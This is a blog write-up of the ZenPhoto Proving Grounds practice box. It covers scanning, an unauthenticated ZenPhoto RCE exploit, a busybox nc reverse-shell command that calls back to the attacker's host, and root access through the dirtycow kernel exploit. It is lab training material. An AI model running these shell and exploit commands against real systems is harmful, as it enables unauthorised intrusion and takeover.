---
layout: writeup
title: ZenPhoto - Proving Grounds
date: 2024-08-13 13:32:20 +0300
description: A Writeup of the ZenPhoto Box from Proving Grounds
image: # /assets/images/Flu/Flu_1.png
fig-caption: # Add figcaption (optional)
tags: [Linux, LainKusunagi, kernel]
---

![ZenPhoto1.png](/assets/images/ZenPhoto/ZenPhoto1.png){: .responsive-image}

Here's a writeup for ZenPhoto, an Intermediate Proving Grounds box from the [LainKusanagi list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). get started with an nmap scan to reveal:
```
PORT     STATE SERVICE
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
3306/tcp open  mysql
```
I head to the browser to check port 80, and I see this. 

![ZenPhoto2.png](/assets/images/ZenPhoto/ZenPhoto2.png){: .responsive-image}

Not super helpful, so I kick off a directory scan which points toward a /test directory.

![ZenPhoto3.png](/assets/images/ZenPhoto/ZenPhoto3.png){: .responsive-image}

Powered by ZenPhoto? You don't say. Viewing the source of this page reveals a version number that might help us to find an exploit.

![ZenPhoto4.png](/assets/images/ZenPhoto/ZenPhoto4.png){: .responsive-image}

It shows a few other directories like `/test/zp-core/images/reset_icon.png` which leads us to the admin page of `192.168.245.41/test/zp-core/admin.php` when we try to few all images, but I search for the version and exploit to get started. Unfortunately most of them seem to require authentication, but there is one [RCE Exploit](https://www.exploit-db.com/exploits/18083) that does not. We save that to our directory as 18083.php (like it's titled in searchsploit) and run `php 18083.php 192.168.245.41 /test/`. 

![ZenPhoto5.png](/assets/images/ZenPhoto/ZenPhoto5.png){: .responsive-image}

That get us a limited shell, so I decided to use `busybox nc 192.168.45.183 4444 -e /bin/bash` to get something more stable. I catch that shell with penelope, and it's time to enumerate. We can't run sudo, and nothing really sticks out from lse or linpeas beyond kernel exploits, which we usually avoid in labs as they are often not the intended path. We do have `gcc` on this machine though, so we can compile a kernel exploit if we need to. 

And after enumerating for a while I did just that. I checked for cron jobs and running processes as well as a number of files which stuck out as potentially containing credentials, but I couldn't find anything that actually did, plus they would have to come for the root user directly. So ultimately I downloaded [dirtycow](https://github.com/firefart/dirtycow) and transferred it to the target machine. From then I simply followed the instructions (`gcc -pthread dirty.c -o dirty -lcrypt`) and ran the binary (`./dirty`) to create a user called `firefart` with the password I chose (`party1`). After that I simply used `su firefart` and entered my password.

![ZenPhoto6.png](/assets/images/ZenPhoto/ZenPhoto6.png){: .responsive-image}

And we're done. Given that the dirtycow exploit is older than the lab machine, maybe it was the intended exploit. Either way, I need to run to the grocery store so I can start dinner, and I'll have to look for alternatives afterward. 

Lessons learned: Not a lot during this box. We use a powerful RCE exploit for one service which allows us to get a shell, and then we use a kernel exploit which we normally avoid during labs like this. Most of the time was spent looking for clues that weren't there on the target (or looking for alternatives to the initial exploit because I didn't realize I could run it from my own command line even though it was a .php file). Overal pretty simple. 

Post-Box Research: Most of the writeups I read actually were some kind of kernel exploits, so while I had options, it does seem like that was the intended path. While I used dirtycow, I also saw PwnKit and [this rds exploit](https://github.com/lucyoa/kernel-exploits/tree/master/rds). 
